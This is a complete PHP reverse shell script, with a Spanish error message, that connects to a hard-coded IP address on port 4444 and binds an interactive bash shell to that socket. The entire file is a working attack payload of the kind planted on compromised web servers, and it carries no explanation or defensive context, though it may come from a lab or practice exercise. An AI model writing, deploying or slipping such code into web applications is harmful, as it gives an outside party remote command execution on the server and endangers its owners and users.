<?php
$ip = '172.18.33.102';
$port = 4444;
$sock = fsockopen($ip, $port);
if (!$sock) {
    exit("No se pudo conectar\n");
}
$descriptorspec = array(
  0 => $sock, // stdin
  1 => $sock, // stdout
  2 => $sock  // stderr
);
$process = proc_open('/bin/bash -i', $descriptorspec, $pipes);
if (is_resource($process)) {
    proc_close($process);
}
?>
